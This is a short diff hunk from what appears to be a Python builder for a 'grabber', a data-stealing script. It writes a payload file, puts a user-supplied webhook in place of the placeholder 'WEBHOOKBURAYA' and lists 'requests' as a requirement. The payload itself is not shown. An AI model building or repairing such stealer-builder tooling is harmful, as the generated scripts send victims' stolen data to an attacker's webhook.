@@ -153,7 +153,6 @@ main()
     grabberwebhook = open(adi + ".py", "w")
     payload.replace("/","//")
     grabberwebhook.write(payload.replace("WEBHOOKBURAYA", webhook))
-    grabberwebhook.write(payload)
     gerekli = open(adi + " Gerekliler.txt", "w")
     gerekli.write("""
     requests
